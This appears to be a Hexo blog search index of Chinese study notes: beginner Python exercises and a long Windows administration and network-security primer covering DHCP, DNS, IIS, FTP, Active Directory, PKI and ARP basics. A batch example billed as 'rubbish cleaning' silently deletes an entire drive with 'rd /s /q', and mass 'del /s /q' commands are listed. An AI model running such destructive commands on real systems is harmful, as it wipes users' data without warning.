<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>未命名</title>
      <link href="/2020/07/21/%E6%9C%AA%E5%91%BD%E5%90%8D/"/>
      <url>/2020/07/21/%E6%9C%AA%E5%91%BD%E5%90%8D/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/07/21/%E6%9C%AA%E5%91%BD%E5%90%8D/image-20200721220302505.png" alt="image-20200721220302505"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>test1</title>
      <link href="/2020/07/20/test1/"/>
      <url>/2020/07/20/test1/</url>
      
        <content type="html"><![CDATA[<p>图片A</p><p><img src="/2020/07/20/test1/assets/image-20200720234511893.png" alt="image-20200720234511893"></p><p>图片B<img src="/2020/07/20/test1/assets/image-20200720234522633.png" alt="image-20200720234522633"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习</title>
      <link href="/2020/07/17/Python%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/07/17/Python%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<hr><hr><h2 id="程序一："><a href="#程序一：" class="headerlink" title="程序一："></a>程序一：</h2><pre><code>&gt; userName = input(&quot;请输入用户名&quot;);&gt; password = input(&quot;请输入密码&quot;);&gt; if &quot;tom&quot; == userName and &quot;123456&quot; == password:          //and代表与，or代表或，not()代表非，if后面不需要加括号，通过冒号结束判断语句。&gt;     print(&quot;用户名：&quot;+ userName + &quot;密码：&quot;+ password);    //注意：if语句下面空4格表示执行if判断结果后的执行语句。&gt; else :&gt;     print(&quot;你的用户名或者密码错误&quot;);</code></pre><h2 id="程序二，成绩判断"><a href="#程序二，成绩判断" class="headerlink" title="程序二，成绩判断"></a>程序二，成绩判断</h2><pre><code>&gt; core = int(input(&quot;请输入成绩&quot;));  //因为输入的字符属于字符串，所以需要使用int()，将输入的字符串转换为int类型，否则报错。&gt; if core &lt; 60:&gt;     print(&quot;成绩不合格&quot;);&gt; elif core &gt;= 60 and core &lt; 70:  //这里elif代表的就是java中的else if 分支判断。&gt;     print(&quot;成绩合格&quot;);&gt; elif core &gt;= 70 and core &lt; 80:&gt;     print(&quot;成绩中等&quot;);&gt; elif core &gt;= 80 and core &lt; 90:&gt;     print(&quot;成绩上等&quot;);&gt; elif core &gt;= 90 and core &lt; 100:&gt;     print(&quot;成绩优秀&quot;);&gt; else:&gt;     print(&quot;成绩输入错误&quot;);</code></pre><h2 id="程序三：字符串赋值"><a href="#程序三：字符串赋值" class="headerlink" title="程序三：字符串赋值"></a>程序三：字符串赋值</h2><pre><code>&gt; string = &quot;python&quot;;     //每个字符串中的字符对应一个索引，从0到5&gt; print(string[0:2]);    //取索引开始为0，个数为2的字符，即“py”，&gt; print(string[0:1000]); //结果为python，与String[0:6]结果相同&gt; print(string[0:1000:2]);//结果为“pto”，从p开始，每次中间隔两个进行取值（步长为2）。&gt; print(string[-1]);      //结果为‘n’，字符串可以倒着进行索引编码。从-1开始。&gt; print(string[-1:-1000:-1]);//结果为nohtyp ，反向取值。&gt; if &quot;py&quot; in string:      //结果为&quot;正确&quot;,表示string这个字符串中含有py两个字符&gt;     print(&quot;正确&quot;); </code></pre><h2 id="程序四"><a href="#程序四" class="headerlink" title="程序四"></a>程序四</h2><p><img src="/2020/07/17/Python%E5%AD%A6%E4%B9%A0/D:%5Cksdler%5CinstallDir%5Cblog%5Csource%5C_posts%5Cimages%5Cimage-20200719232842284.png" alt="image-20200719232842284"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安全基础学习</title>
      <link href="/2020/04/08/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/04/08/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="虚拟机设置"><a href="#虚拟机设置" class="headerlink" title="虚拟机设置"></a>虚拟机设置</h2><p>vmnet实际上表示虚拟交换机，一共vmnet1-vmnet19，将系统连接到某个交换机上，相当于机房中的真实机有一根网线连接到真实交换机上。每个vmnet对应一个虚拟网卡。其中vmnet0表示的是真实机所连接的交换机，如果连接到vmnet0，则相当于该系统从虚拟机跳出来直接连接到真实交换机，可以使用该虚拟机完全当作真实机使用。<br>1.使用桥接模式：使用的真实机的网卡，可以连接互联网也可以实现虚拟机和真实机互联，可以将其看作一个真实机，但网段必须与真实机一样。<br>2.NAT模式：虚拟机使用vmnet8这块虚拟网卡，虚拟机可以连接互联网，但是虚拟机只可以访问自己的真实机，但是不能访问其他真实机 （注意由于版本原因导致我安装的xp和win2003不能连接互联网）<br>3.仅主机模式：虚拟机会使用vmnet1这块网卡，虚拟机不能够上网，只能与真实机和虚拟机互访<br>4.网卡：vmnet0实际上就是桥接，即虚拟机直接连接到真实网络<br>虚拟机不能上网的原因，配置虚拟网络编辑器，更改网络设置，使用桥接网络，并且在桥接网络中有几个选项，分别为蓝牙连接，无线网卡连接，有线连接等，这里我们设置成自动即可，或者设置成对应的情况。虚拟机不能上网可能是虚拟机自动选择网卡时选择错误，所以在桥接网络中如果真实机使用无线网络，虚拟机就配置无线网卡<br>镜像下载网站：<a href="http://www.itellyou.com" target="_blank" rel="noopener">www.itellyou.com</a><br>下载地址二：<a href="https://blog.csdn.net/z_xindong/article/details/86776475" target="_blank" rel="noopener">https://blog.csdn.net/z_xindong/article/details/86776475</a></p><h2 id="window命令"><a href="#window命令" class="headerlink" title="window命令"></a>window命令</h2><ol><li>cd :直接退到更目录下  </li><li>rd :删除空文件夹  </li><li>rd /s /q:无条件删除空文件夹  /s 表示包括子文件夹也就是目录树，/q表示无需提示，安静模式</li><li>echo 字符串 &gt;&gt; 路径 + 文件名.扩展名 ：将字符串写入到文件夹中，写在最后面  </li><li>echo  字符串 &gt; 路径 + 文件名.扩展名 ：将字符串覆盖原有内容  </li><li>type 文件名.扩展名：浏览该文件</li><li>del 文件名.扩展名 ：删除文件  </li><li>del <em>.</em> /s /q :删除所有文件 /s表示包括所有空文件夹  </li><li>attrib +h 文件夹  ：隐藏文件夹 h表示hidden  </li><li>attrib -h 文件夹名称 ：取消隐藏文件夹  </li><li>shutdown -s -t 秒:定时关机，-s表示关机 -t表示时间  </li><li>shutdown -s -f -t :表示定时强制关机，有时候12命令不好用的情况下  </li><li>shutdown -r -t 秒:定时重启  </li><li>shutdown -a :取消所有定时  </li><li>shutdown -l:注销  </li><li>copy 原文件路径名 目标文件路径名 ：复制文件  </li><li>./：当前路径名  </li><li>../:上一级路径  </li><li>move  原文件路径名 目标文件路径名：移动文件  </li><li>ren 旧名 新名 ：将文件/文件夹重命名，ren是rename的缩写  </li><li>/P 删除每一个文件之前提示确认。<br>/F 强制删除只读文件。<br>/S 从所有子目录删除指定文件。<br>/Q 安静模式。删除全局通配符时，不要求确认。<br>/A 根据属性选择要删除的文件。<br>attributes R 只读文件 S 系统文件   </li><li>netstat -an：查看所有端口  </li><li>net share ：查看所有共享文件夹列表</li><li>net share 共享名 /del:关闭共享</li><li>ipconfig /flushdns 修改dns缓存。</li><li>nslookup <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 解析baidu的ip地址。</li></ol><h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><p>批处理文件 文件名.bat<br>里面执行的使dos命令<br>开头写上@echo off 关闭回显及不显示执行过程，只显示执行结果，结尾写上pause防止闪退，&gt;nul &nbsp;2&gt;nul表示屏蔽输出，及不管执行正确与否都不会显示输出</p><p>代码</p><pre><code>@echo off  color 0atitle my titleecho ===========echo the programeecho============pauseecho rubbish is cleaning....E: &gt;nul 2&gt;nul //进入E盘使用 &gt; nul 2&gt;nul是为了防止出现报错信息cd / &gt;nul 2&gt;nulrd ./s/q &gt;nul 2&gt;nulping -n 127.0.0.1 &gt;nul 2&gt;nulecho congratulationpause如果不加&gt;nul 2nul 就会出现如下情况:  the programe请按任意键继续. . .  rubbish is cleaning....  .\$RECYCLE.BIN - 拒绝访问。  .\SYSTEM~1 - 拒绝访问。congratulation  请按任意键继续. . .</code></pre><p>：冒号用来区分区块的,相当于swith语句中的case，使用goto语句可以跳转到区块位置<br>@echo off<br>tile 飞鸽小程序</p><h4 id="小案例"><a href="#小案例" class="headerlink" title="小案例"></a>小案例</h4><pre><code>:menuecho ====================echo     菜单echo 1.定时关机echo 2.取消定时echo 3.推出echo ====================set /p num = 请选择您的选项if &quot;%num%&quot; ==&quot;1&quot; goto 1if &quot;%num%&quot; ==&quot;2&quot; goto 2if &quot;%num%&quot; ==&quot;3&quot; goto 3echo 输入错误goto memu:1set /p a=请输入结束时间:shutdown -s -f -t %a%goto menu:2shutdown -agoto menu:3exit</code></pre><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p>windows服务器版本win2000，win2003，win2008，win2012<br>Linux服务器：redhat centos<br>每个账户有自己的SID（安全标识符）<br>用户SID：S-…..-500  其中前面表示系统SID，后面500表示管理员的UID为500，普通用户后面接的从1000开始。<br>查看sid值：whoami /user<br>账户密码存储位置：C:\windows\system32\config\SAM,windows系统上，默认密码最长有效期为42天  </p><h4 id="账户"><a href="#账户" class="headerlink" title="账户"></a>账户</h4><ol><li>给人使用的账户<br>administrator #管理员账户<br>guest #来宾账户  </li><li>计算机系统账户<br>system  :系统账户，<font color="red">权限最大</font><br>local services :本地账户=普通用户<br>net services:本地账户= 普通账户  </li></ol><p>账户保存路径（家）<br>win7/win2008 C:\用户\<br>xp/win2003 C:\documents and settings\</p><h4 id="用户命令"><a href="#用户命令" class="headerlink" title="用户命令"></a>用户命令</h4><p>net user ：查看所有用户<br>net user 用户名  密码 ：为用户更改密码<br>net user 用户名 密码 /add ：创建一个新用户<br>net user 用户名 /active:yes/no: 激活或者禁用用户  </p><h2 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h2><p>作用：将需要赋予一样权限的用户放在一个组中，这样可以方便为该用户赋予权限  </p><h4 id="内置组-权限从高到低排序"><a href="#内置组-权限从高到低排序" class="headerlink" title="内置组 权限从高到低排序####"></a>内置组 权限从高到低排序####</h4><p>administrators :管理员组<br>guests：来宾组<br>uses：用户组<br>network：网络配置组<br>print：打印机组<br>remote desktop：远程桌面组  </p><h4 id="组管理命令"><a href="#组管理命令" class="headerlink" title="组管理命令"></a>组管理命令</h4><p>net localgroup:列出所有组<br>net localgroup 组名：查看该组的所有成员<br>net localgroup 组名 /add:添加该组（后面可以为该组赋予权限）<br>net localgroup 组名 用户名 /add 添加用户到组<br>net localgroup 组名 用户名 /del：删除用户<br>net localgroup 组名 /del：删除组</p><h2 id="服务器远程管理"><a href="#服务器远程管理" class="headerlink" title="服务器远程管理"></a>服务器远程管理</h2><p>可视化实现<br>1，将winxp和win2003连接在同一个局域网中，以保证能ping通<br>2.将服务器的远程桌面开启，我的电脑-&gt;右键属性，远程-&gt;开启远程桌面<br>3.在客户机上win+r输入mstsc，输入ip，输入用户名和密码（注意，如果是普通用户，是无法完成远程登录的，因为没有这个权限，所以，需将该用户放到remote desktop这个组中）<br>命令行实现<br>1.服务器win+r输入services.msc 找到telnet服务将其改为启动并且自动，这样每次开机后就会启动<br>2.在客户机上进入命令行窗口输入telnet +ip,输入账号和密码  ，结果发现telnet仍然关闭，这是因为没有赋予权限，将用户放到TelnetClients这个组中，如果没有就手动添加。</p><h2 id="NTFS权限"><a href="#NTFS权限" class="headerlink" title="NTFS权限"></a>NTFS权限</h2><p><strong>文件系统</strong>：实际上就是格式化后系统重新在磁盘上划分格子的过程<br>常用的文件系统 1.FAT(windows) 2.NTFS(windows) 3.EXT(linux)<br>NTFS特点 提高磁盘读写性能，可靠，磁盘利用率高，支持单个文件大于4G，NTFS应用于文件比较大的磁盘比较合适，而FAT应用于文件比较小的磁盘，否则会比较浪费磁盘资源，以上优点都是FAT不具有的。所以我们在安装系统时通常选择NTFS<br><strong>修改NTFS权限</strong><br>特殊权限：控制文件权限列表的权限<br>当用户同时属于多个组时，权限是累加的，即该用户拥有所属于的所有组的权限<br><strong>拒绝权限最大：</strong>当用户a属于b组，但b组中的文件不想让a看，所以在权限中添加a用户然后权限选择全部拒绝。<br>强制继承：文件夹下的各个子文件夹权限不同，现在需要将子文件夹的权限都改成父文件夹的权限，进行权限同一。解决：文件右键，属性，安全，高级，勾选第二个对号。<br><strong>文件复制对权限的影响：</strong>同一级文件复制后，被复制的文件权限被改变为父级的文件权限，同一级的文件剪切后，被剪切的文件放到文件后权限不变。不是同一级的文件复制或者剪切后出现被复制的文件权限被更改为父级文件夹的权限。<br><strong>隐藏共享文件夹</strong>：如果某个文件夹不想要被别人看见，填写共享名，并且后面加上$符号，例如share$，那么访问者就不会看见该文件夹，如果想要被指定的人访问，则让访问者在后面加上隐藏的文件的名称，例如 \+ip+\share$<br><strong>列出所有共享文件夹</strong>  net share  所有盘符默认共享<br><strong>关闭共享</strong> net share 共享名 /del，但是开机之后仍然默认共享所有盘符 ，如果想要有些东西共享，有些不共享，解决：在删除共享之后，更改注册表将自启动共享关闭，即在注册表中找到 hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters\右键建立DWORD文件，名称为AutoShareServer,值为0，这样下次开机时就不会默认开启所有共享<br>计算机只作为网页服务器，关闭共享服务，在服务中，将server这个服务关闭即可。这样该计算机就不会提供共享服务。<br><strong>添加共享</strong> net share c: /add  </p><h2 id="PE破解系统"><a href="#PE破解系统" class="headerlink" title="PE破解系统"></a>PE破解系统</h2><p>u深度增强版</p><h2 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h2><p>作用：自动分配ip地址<br>概念：地址池：（包括ip，子网掩码，网关，DNS，租期）<br>原理：<br>1）客户机发送DHCP Discovery广播包，以在服务器上请求ip地址<br>2）多个服务器收到请求，响应DHCP Offer广播包，但是到达客户机的时间是有先后顺序的。<br>3）客户机发送DHCP Request广播包 说是请求包，实际上更准确是选择包，但是在选择之后，需要向服务器进行ip，子网掩码，网关等请求分配，所以用request<br>4）服务器发送DHCP ACK广播包 确定租约，并提供ip，网关等信息。<br><strong>DHCP续约</strong><br>因为分配的ip地址不可能永远给某一个计算机，所以ip地址使用是有期限的，假如租约为24小时，那么在50%时间即12小时后客户机会发送DHCP Request包，与服务器关于ip地址进行续约，如果出现特殊情况，在50%时间时服务器宕机，则在87.5%时间重新发送一下请求包，以请求续约，如果仍无响应，那么就释放ip地址，重新进行分配。<br>（补充）如果使用kali系统一直进行请求分配ip地址，那么总有一天服务器的资源总会有消耗尽的情况，所以这就是DHCP安全，但是像思科，华为等设备分配ip地址时会与客户机的MAC地址进行绑定，所以不会出现DHCP攻击情况，这也就是硬件安全。<br><strong>DHCP部署</strong><br>将win2003作为服务器，也就是地址池，客户机从该服务器中自动获取服务器网段的ip地址。<br> 虚拟机中将服务器和客户机连接到同一个网卡上。例vmnet2-&gt; 点击我的电脑中cd光驱，-&gt;选中安装可选的windows组件-&gt; 找到网络服务，双击打开，找到动态主机配置协议，勾上。-&gt;注意，需要将win2003配置成为静态ip，即设定固定ip。（此时开启了67，68端口），-&gt;在所有程序，管理工具中打开dhcp开始设置作用域，-&gt;右键服务器名称-&gt;新建作用域，-&gt;设置名称和描述-&gt; 设置分配地址范围，通常前面预留出来20个，因为公司可能有其他服务器，后面预留出5个，作为网关，例192.168.0.21-192.168.0.250-&gt;ip地址排除，如果在该范围内某个ip有其他的作用，可以将其排除，-&gt;设置服务器租约期限，即客户机多长时间更换一次ip-&gt;设置dhcp选项，即网关，例与公司网关吻合，-&gt;设置dns服务器，父域不用写，直接写ip地址，即win2003应该访问哪个服务器例114.114.114.114。-&gt;设置wins服务器，不再使用它，直接下一步。-&gt;激活-&gt;客户机winxp查看ip，首先将本地连接停用，再开启，起到更新的作用.失败的原因，客户机默认是连接再vmware默认的服务器上，没有连接在win2003上，所以需要设置。-&gt;在vmwrae上编辑-&gt;修改网络编辑器，-&gt;更改设置，-&gt;设置成自己选择的网卡，-&gt;将使用本地dhcp服务将ip地址分配给虚拟机前面的对号勾掉。即可。<br><strong>释放IP</strong> 命令ipconfig /release<br><strong>重新分配ip</strong> 命令：ipconfig /renew<br>问题：如果服务器想对某个计算机分配固定的ip，针对该计算机例如老板，服务器永远只给她分配固定的ip，怎样解决？首先在客户机端 ipconfig /all 复制mac地址，打开dhcp中，新建保留，设置ip和粘贴mac地址，即可。<br>问题2：如果以上的设置不小心被删除了，可以导入以前的备份文件，前提是有备份文件，也是在dhcp中设置本分，  保存即可。<br>问题3：可为该服务器分配多个作用域，以解决多个部门使用不同的ip地址范围。  </p><h2 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h2><p>DNS：用来解析ip地址的。例如如果京东的服务器在北京，但是广东的用户想要访问京东，不需要通过广东到北京的路由器，而是在广东本地搭建dns服务器，dns服务器与京东的服务器是互相关联的，具有同样的作用，因此用户只需要访问广东的dns服务器即可进行访问。在cmd中输入nsloopup <a href="http://www.jd.com就可以显示非权威应答（Non-authoritative" target="_blank" rel="noopener">www.jd.com就可以显示非权威应答（Non-authoritative</a> answer:）实际上就是分支服务器。搭建过程与DHCP一样，只不过是选择DNS即可。安装路径设置在e盘否则报错<br>DNS的解析过程，和路由器差不多的原理，都是客户机发起请求后，进行DNS服务器查找，域名，然后进行解析。类似路由器之间的查找。<br>服务器创建完DNS服务器之后，需要新建正向DNS域（反向dns域表示根据ip地址获取域名，配置反向解析中需要进行指针指向所配置好的正向的dns服务器），即创建DNS服务器，域名称baidu.com，告诉大家使用该DNS服务器的客户机访问baidu.com时会解析为指定的ip，SOA告诉解析baidu.com的服务器是谁，NS这是备份服务器。在空白处右键，新建主机，主机名为www，ip地址即自己指定访问<a href="http://www.baidu.com时解析为哪个ip地址。此时在客户机上使用nslookup" target="_blank" rel="noopener">www.baidu.com时解析为哪个ip地址。此时在客户机上使用nslookup</a> <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 解析域名发现与指定的DNS不符，这是因为没有指定DNS服务器，所以在配置固定ip地址的提示框中手动配置DNS服务器为Win2003的ip地址，修改dns后 ipconfig /flushdns 刷新dns缓存。<br>如果想要客户机使用wind2003-1配置的dns服务器，转换到win2003-2配置的dns服务器，可以点击win2003中搭建的服务器，然后右键有个转发器设置成win2003-2的ip地址即可。<br>如果域名没有在dns服务器中配置，那么服务器最终会找到根服务器然后进行解析<br>如果想要设置win2003-1为主dns服务器，-2为备份dns服务器，那么先在win2003上dns上点击域名右键属性，设置备份ip地址为win2003-2的ip地址。然后在win2003-2上创建辅助区域，名称为win2003-1备份的域名，ip地址设置为win2003-1的ip。<br><strong>手工解析域名：</strong>例如nslookup <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>     </p><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>IIS是网站服务器，属于微软的。类似于apache，phpstudy等网页服务器。<br>在IIS配置：在一个网站中右击属性，有个ip配置，全部未分配表示该服务器可能具有多个ip（在配置ip时有个高级，在高级中可以配置多个ip），那么客户机访问该网站时可以以任意一个ip进行访问，但是如果指定了ip，那么就只能以该ip访问<br>IIS网站存放目录 在inetpub下的wwwroot文件夹下。<br>配置网站时，如果想要不输入ip+端口，那么在开始配置时可以添加主机头，或者在属性，网站，ip后面的高级中配置主机头值，即www…com，那么在访问的时候就只输入www.网站名.com 即可访问。<br>在配置默认首页时，将指定的页面放在第一位，那么访问该网站时，可以不输入首页直接写ip地址+端口号就可以访问。<br>如果想要访问动态网页（可以互动的网页），那么在web服务扩展中将active server pages服务开启。<br>如果在网站的主文件夹下，或者访问其他文件夹下的网页不能访问，或者提示没有开启父路径，这是因为没有开启父路径的缘故，点击网站，右键属性，在主目录中打开配置，点击选项，开启父路径。</p><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>端口21：控制模式，即控制客户机与服务器之间的连接过程<br>20端口：数据模式，用在客户机和服务器之间的数据传输。<br>file transfor protocol<br>类似于远程管理，可以远程下载。开启方式，控制面板，添加或删除程序，双击应用程序服务器，双击internet信息服务，开启FTP服务。也是在IIS中找到FTP站点。访问方式，在我的电脑，输入路径<a href="ftp://ip即可访问，但是默认只能访问c:\inetpub\ftproot下的文件夹，如果想要访问其他文件夹，需要在服务器上属性中更改路径即可。">ftp://ip即可访问，但是默认只能访问c:\inetpub\ftproot下的文件夹，如果想要访问其他文件夹，需要在服务器上属性中更改路径即可。</a><br>现在要求FTP服务器中特定用户客户机（需要输入账号和密码）对于某个文件夹只能上传，，先创建用户和密码 。找到FTP配置的根目录下的文件夹，右键属性，安全，高级，取消‘允许父项的继承权限’（因为它的上一级文件夹是完全控制），复制，确定，在用户中添加需要公开的用户。然后再权限中将读取去掉，将写入勾上（因为要求该用户只能上传不能下载）。另一个用户如果只能下载不能上传，只需勾选读取即可。<br>如果要求客户机只能输入账号密码才能访问，还要再客户机上右击网站，属性，安全账户，将允许匿名访问前面的勾去掉。这样当访问该主目录时权限完全匹配。如果出现权限不匹配的情况，那可能是创建该用户的管理员的权限问题。<br>开启服务器比较好用的软件 ftp server.exe，作为开启服务器的软件，设置权限和密码时比较方便。注意如果使用ftpserver就关闭iis中的ftp站点，*<em>需要关闭防火墙 *</em> </p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>domin  本地系统帐户是本机建立的用户帐户,域账户是<strong>域服务器</strong>上由管理员分配度给你的帐户<br>好处：集中管理，统一管理，人人不平等。<br>组成：1.域控制器：DC 2.成员机<br>条件：1）安装域控制器就生成了域环境 2）安装了活动目录就安装了域控制器 3）活动目录 Active Directory = AD，活动目录就是AD，特点：集中/统一管理<br><strong>配置过程：</strong><br>1.使用win2008服务器。关闭防火墙。选择ipv4地址，不选择ipv6地址。<br>2.配置静态ip地址，win2008的dns配置不需要填写，空着，让他自动使用安装的dns服务器。<br>3.右键我的电脑，管理，角色（即服务），添加角色，找到active directory域服务。但是这种方法安装后不全面，所以在运行里面输入 dcpromo,勾选dns，勾选新建林中新建域，级别设为2003，及林中最低级别系统为2003，直至完成。（注意只需要给win2008安装活动目录，因为将2008作为域服务器，而其他客户机只需要加入域就可以了）<br>4.当本地本地账户升级为dc后，则本地管理员就变成域管理员，权限变大了，所以也没有用户和组这个选项了。<br>5.此时查看登录用户，都是qf.com/administrator这个账户，说明administrator是属于域管理员了。<br>6.<strong>将win7加入域：</strong>需要将同一域中的计算机连在同一网卡上，同时ip在同一网段上，dns设置为配置域的服务器的ip地址，即win2008的ip<br>7.将计算机加在域中，右击计算机，属性，计算机名称，更改设置，加入域，域名为qf.com，弹窗后使用域管理员登录，即qf.com\administrator 密码123.com,重启计算机，使用域管理员登录即可。<br>8.在管理工具中找到active derectory 用户和计算机，找到qf.com,computer，看到已经有一个计算机加入该域了。<br>9，在域服务器中创建普通用户：找到users，右键新建用户，输入姓名，用户名，密码等，完成后在用户列表中可以看到用户名。此时在win7中使用该用户名，密码就可以登录win7系统，说明该用户是在win2008中创建的域用户，但是可以在其他的域客户机中进行登录，即该用户名是被域服务器管理的。<br>10:登录不成功的情况：这是因为用户名前面没有加上域名，有的系统会自动在下面加上qf.com,但是有的系统需要自己手写qf.com\tao.yang<br>11权限问题：因为tao.yang属于普通域用户，但是它想要与本地管理员相同的权限。操作：客户机使用qf.com/administrator（域管理员）登录，然后打开服务中本地用户和组，将tao.yang添加到本地管理员中即可（可以看到域管理员属于本地用户中管理员权限，而普通域用户属于本地普通用户权限）将用户加入到普通成员机的本地管理员组中，千万不能将普通域用户提高到域管理员，因为域管理员是对整个域进行操作，而本地管理员只对本机有最高操作权限。另一种方式，使用本地管理员登录，然后再本地用户和组中添加tao.yang 到本地管理员组，但是需要获得域管理员的权限（需要输入域管理员的账号和密码），<strong>因为域成员是受域管理员（domin admin）的管控，不受本地管理员的管控</strong><br>12,域管理员-domin admin<br>13，组织成员：OU：用来归类资源，即归类域资源，域计算机，域组，与本地计算机中的组差不多。<br>创建组织单位，打开active derectory计算机和用户，找到最大的域服务器，即qf.com 然后右键新建，组织单元，输入名称之后确定，在右击前锋集团，右键新建组织单元，董事会，一次进行创建。然后将users中的‘杨涛’，右键移动到西北区。张三移动到IT部。以上是对用户进行操作，如果用户离职了，但是想对域计算机进行控制，所以需要将计算机也添加到组织单位中，在目录中的computer中查看计算机名，然后也移动到对应的部门。这是对计算机进行限制，而前面是对用户进行限制。<br>14：组策略：GPO，可以修改计算机的各种属性，共有成千上万中属性。在管理工具有个组策略管理，里面含有所有组策略。默认是没有组策略表的，所以点击前锋集团，右键创建GPP…,所有创建完成之后，点击生成的组策略表，右键编辑即可进行用户或者计算机属性更改。  如果忘记了自己都设置了哪些组策略，那么就在组策略设置的右侧有个设置，找到管理模板就可以查看了。<br>15，<strong>默认情况下的</strong>权限：LSDOU，L：本地 S：站点 D：domin OU：代表所有组策略 即先看自己的本地组策略，s不常用 然后是domin，当本地没有设置的情况下，默认使用domin设置的组策略<br>16，如果客户机自己设置了组策略，但是上级要求按照上级的配置，所以可以点击千锋集团，右键有个强制，即可强制要求所有下级配置的组策略全部按照自己的配置。<br>17，如果本级设置了阻止继承，那么在上级没有设置强制的情况下设置了组策略，会使用本级的设置，不使用上级的设置，如果上级设置了强制，那么就使用上级的设置。<br> 例如网吧的电脑，当关机或者注销之后，所有的安装软件或者文件都会别自动删除，这就是使用了组策略中计算机设置的注销或者关机时调用了删除命令。例如设置密码长度，密码使用期限等</p><h2 id="PKI技术"><a href="#PKI技术" class="headerlink" title="PKI技术"></a>PKI技术</h2><p>PKI<br>1、PKI概述<br>名称：Public Key Infracation公钥基础设施<br>作用：通过加密技术和数字签名保证信息的安全<br>组成：公钥加密技术、数字证书、CA（证书颁发机构）、RA</p><p>2、信息安全三要素<br>机密性，即传输的信息是保证无法破解的<br>完整性，传输的信息是完整的，不会出现丢包的情况<br>身份验证/操作的不可否认性，是A发的就指定A，不能否认是A发的信息。  </p><p>3.哪些IT领域用到PKI：<br>1）SSL/HTTPS<br>2）IPsecVPN<br>3）部分远程访问VPN  </p><p>4、公钥加密技术<br>作用：实现对信息加密、数字签名等安全保障<br>加密算法：<br>          1）对称加密算法，即A和B之间进行传输，发送发和接收方都使用相同的密钥。<br>         加解密的密钥一致！<br>             DES  3DES  AES  </p><pre><code>     2）非对称加密算法       *通信双方各自产生一对公私钥。           *双方各自交换公钥           *公钥和私钥为互相加解密关系！           *公私钥不可互相逆推！            RSA  DH  </code></pre><p>HASH算法：MD5  SHA （验证完整性）<br>HASH值可逆么？不可逆</p><p>数字签名：<br>用自己的私钥对摘要加密得出的密文就是数字签名</p><p>5证书：<br>证书用于保证公密的合法性<br>证书格式遵循X.509标准<br>数字证书包含信息：<br> 使用者的公钥值<br> 使用者标识信息（如名称和电子邮件地址）<br> 有效期（证书的有效时间）<br> 颁发者标识信息<br> 颁发者的数字签名   </p><p>数字证书由权威公正的第三方机构即CA签发<br>CA是权威证书颁发机构，为了公正“公钥”的合法性！<br>机密性：使用对方的公钥加密！<br>身份验证/数字签名：使用自己的私钥！  </p><p><strong>非对称算法原理：</strong> A和B之间进行通讯，A和B都有自己的公钥和私钥，他们可以互相识别，但是不可逆推，即不能从公钥推出私钥，也不能从私钥推出公钥，首先A和B之间交换公钥，这样A和B分别有三把密钥，即自己的公钥和私钥加上对方的公钥，然后数据包使用算法进行加密（RSA算法），在这其中，把从对方获得的公钥插入该算法中，发送数据包，当互相获取到数据包之后使用自己的私钥来匹配自己的公钥，解开数据包，这样就解密完成。如果攻击者从传输间获取到了公钥，这也没有关系，因为私钥是只有自己才拥有的，攻击者获取不到私钥。但是还有另一问题，就是对方怎么确定是对方发送的数据包，有没有可能是第三方发送的。这就考虑到数据签证的问题。此时A和B进行通讯。A发送数据包给B，B不能确定这是不是A发送过来的，所以不能接受，但是此时我们加入第三方认证机构（类似于公安局），A告诉公安局A的身份，B告诉公安局B的身份。此时他们都是相信公安局的。当A发送给B时，中间先通过公安局，公安局在告诉B这个的确是A，此时A和B可以相互确认身份，可以互相通信了。</p><p>===========================================</p><p>****实验名称：部署HTTPS服务器/部署SSL服务器</p><p>实验环境：<br>1）win2008作为https服务器：10.1.1.2/24<br>2）win7作为客户机：10.1.1.1/24<br>3）桥接到虚拟网络vmenet1</p><p>实验步骤：<br>1.配置服务器IP地址10.1.1.2/24。</p><p>2.安装IIS服务 并建立一个站点。(必须使用域名)并配置DNS服务器，并初步验证访问<a href="http://www.flower.com一下。" target="_blank" rel="noopener">http://www.flower.com一下。</a></p><p>3.安装CA组件</p><p>4.打开IIS，先生成证书申请文件</p><p>5.向CA申请证书：<br>  打开网页<a href="http://10.1.1.2/certsrv并向CA发送web服务器申请文件" target="_blank" rel="noopener">http://10.1.1.2/certsrv并向CA发送web服务器申请文件</a></p><p>6.CA颁发证书</p><p>7.在web服务器上下载并完成安装</p><p>8.在web服务器上启用SSL443</p><p>9.要求用户必须使用443访问，不能使用80访问！</p><h2 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h2><p>ARP攻击永远只能攻击内网，如果攻击外网需要经过路由表，而arp协议无法通过路由表，因为他不知道自己应该去哪里。<br>=====广播与广播域=====<br>广播：将广播地址做为目的地址的数据帧<br>广播域：网络中能接收到同一个广播所有节点的集合，广播域越小越好，因为如果越大，则广播中产生的垃圾越多。<br>MAC地址广播<br>广播地址为FF-FF-FF-FF-FF-FF  </p><p>IP地址广播<br>1）255.255.255.255<br>2）广播IP地址为IP地址网段的广播地址，如192.168.1.255/24  